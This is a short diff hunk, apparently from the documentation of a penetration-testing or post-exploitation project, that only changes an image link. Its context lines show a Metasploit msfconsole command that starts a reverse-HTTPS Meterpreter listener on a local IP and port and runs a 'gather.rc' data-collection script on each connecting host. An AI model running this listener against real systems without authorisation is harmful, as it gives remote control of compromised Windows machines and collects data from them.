@@ -220,7 +220,7 @@
 
       sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'
 
-![gif](http://i63.tinypic.com/dmxp93.gif)
+![gif](http://i68.tinypic.com/1zzhlhz.gif)
 
 <br />
 
